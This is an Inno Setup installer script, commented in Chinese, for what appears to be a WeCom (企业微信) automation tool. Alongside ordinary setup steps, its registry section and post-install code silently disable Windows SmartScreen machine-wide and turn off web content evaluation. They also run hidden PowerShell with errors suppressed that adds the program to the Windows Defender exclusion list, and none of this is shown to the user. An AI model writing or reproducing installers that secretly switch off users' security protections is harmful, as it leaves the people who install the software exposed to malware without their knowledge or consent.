; 脚本由 Inno Setup 脚本向导生成

#define MyAppName "企业微信自动化工具"
#define MyAppVersion "1.0"
#define MyAppPublisher "beita"
#define MyAppExeName "企业微信自动化工具.exe"

[Setup]
; 注: AppId的值为单独标识该应用程序。
; 不要在其他安装程序中使用相同的AppId值。
AppId={{YOUR-GUID-HERE}
AppName={#MyAppName}
AppVersion={#MyAppVersion}
AppPublisher={#MyAppPublisher}
DefaultDirName={autopf}\{#MyAppName}
DefaultGroupName={#MyAppName}
OutputDir=output
OutputBaseFilename=企业微信自动化工具安装程序
Compression=lzma
SolidCompression=yes
WizardStyle=modern
; 添加管理员权限
PrivilegesRequired=admin

[Tasks]
Name: "desktopicon"; Description: "{cm:CreateDesktopIcon}"; GroupDescription: "{cm:AdditionalIcons}"; Flags: unchecked
Name: "quicklaunchicon"; Description: "{cm:CreateQuickLaunchIcon}"; GroupDescription: "{cm:AdditionalIcons}"; Flags: unchecked; OnlyBelowVersion: 6.1; Check: not IsAdminInstallMode

[Files]
Source: "dist\{#MyAppExeName}"; DestDir: "{app}"; Flags: ignoreversion
Source: "dist\*"; DestDir: "{app}"; Flags: ignoreversion recursesubdirs createallsubdirs
; 注意: 不要在任何共享系统文件上使用"Flags: ignoreversion"

[Icons]
Name: "{group}\{#MyAppName}"; Filename: "{app}\{#MyAppExeName}"
Name: "{group}\{cm:UninstallProgram,{#MyAppName}}"; Filename: "{uninstallexe}"
Name: "{autodesktop}\{#MyAppName}"; Filename: "{app}\{#MyAppExeName}"; Tasks: desktopicon
Name: "{userappdata}\Microsoft\Internet Explorer\Quick Launch\{#MyAppName}"; Filename: "{app}\{#MyAppExeName}"; Tasks: quicklaunchicon

[Run]
Filename: "{app}\{#MyAppExeName}"; \
Description: "启动 {#MyAppName}"; \
Flags: postinstall nowait skipifsilent shellexec; \
WorkingDir: "{app}"; \
Check: FileExists(ExpandConstant('{app}\{#MyAppExeName}'))

[Registry]
; 基本设置
Root: HKCU; Subkey: "Software\Microsoft\Windows\CurrentVersion\AppHost"; ValueType: dword; ValueName: "EnableWebContentEvaluation"; ValueData: "0"; Flags: uninsdeletevalue noerror

; 注册自定义协议
Root: HKCR; Subkey: "autowxwork"; ValueType: string; ValueName: ""; ValueData: "URL:autowxwork Protocol"; Flags: uninsdeletekey noerror
Root: HKCR; Subkey: "autowxwork"; ValueType: string; ValueName: "URL Protocol"; ValueData: ""; Flags: uninsdeletevalue noerror
Root: HKCR; Subkey: "autowxwork\DefaultIcon"; ValueType: string; ValueName: ""; ValueData: """{app}\{#MyAppExeName},1"""; Flags: uninsdeletevalue noerror
Root: HKCR; Subkey: "autowxwork\shell\open\command"; ValueType: string; ValueName: ""; ValueData: """{app}\{#MyAppExeName}"" ""%1"""; Flags: uninsdeletevalue noerror

; SmartScreen 设置
Root: HKLM; Subkey: "SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer"; ValueType: string; ValueName: "SmartScreenEnabled"; ValueData: "Off"; Flags: uninsdeletevalue noerror; Check: IsAdminInstallMode
Root: HKCU; Subkey: "SOFTWARE\Microsoft\Windows\CurrentVersion\AppHost"; ValueType: dword; ValueName: "PreventOverride"; ValueData: "0"; Flags: uninsdeletevalue noerror

[Code]
// 检查是否已安装
function InitializeSetup(): Boolean;
var
  ResultCode: Integer;
  Uninstaller: String;
  UninstallChoice: Boolean;
begin
  Result := True;

  // 检查注册表中是否存在卸载信息
  if RegQueryStringValue(HKLM, 'SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\{#SetupSetting("AppId")}_is1',
    'UninstallString', Uninstaller) then
  begin
    UninstallChoice := MsgBox('检测到已安装旧版本，是否先卸载？' #13#13 '点击 Yes 卸载旧版本' #13 '点击 No 直接覆盖安装',
      mbConfirmation, MB_YESNO) = IDYES;
      
    if UninstallChoice then
    begin
      // 运行卸载程序
      Exec(RemoveQuotes(Uninstaller), '/SILENT', '', SW_SHOW, ewWaitUntilTerminated, ResultCode);
      
      // 如果卸载失败，询问是否继续
      if ResultCode <> 0 then
      begin
        Result := MsgBox('无法卸载旧版本，是否继续安装？', mbConfirmation, MB_YESNO) = IDYES;
      end;
    end;
  end;
end;

// 安装完成后的操作
procedure CurStepChanged(CurStep: TSetupStep);
var
  ResultCode: Integer;
begin
  if CurStep = ssPostInstall then 
  begin
    try
      // 使用 PowerShell 添加信任设置
      Exec('powershell.exe', 
           '-Command "& {' + 
           'Set-ItemProperty -Path ''HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer'' -Name ''SmartScreenEnabled'' -Value ''Off'' -ErrorAction SilentlyContinue; ' +
           'Set-ItemProperty -Path ''HKCU:\Software\Microsoft\Windows\CurrentVersion\AppHost'' -Name ''EnableWebContentEvaluation'' -Value 0 -ErrorAction SilentlyContinue; ' +
           'Set-ItemProperty -Path ''HKCU:\Software\Microsoft\Windows\CurrentVersion\AppHost'' -Name ''PreventOverride'' -Value 0 -ErrorAction SilentlyContinue' +
           '}" 2>$null', 
           '', SW_HIDE, ewWaitUntilTerminated, ResultCode);
           
      // 添加到 Windows Defender 排除列表
      Exec('powershell.exe', 
           '-Command "& {Add-MpPreference -ExclusionPath ''' + ExpandConstant('{app}\{#MyAppExeName}') + ''' -ErrorAction SilentlyContinue}" 2>$null', 
           '', SW_HIDE, ewWaitUntilTerminated, ResultCode);
    except
      // 捕获任何异常但继续安装
      Log('Exception occurred during post-install operations');
    end;
  end;
end;
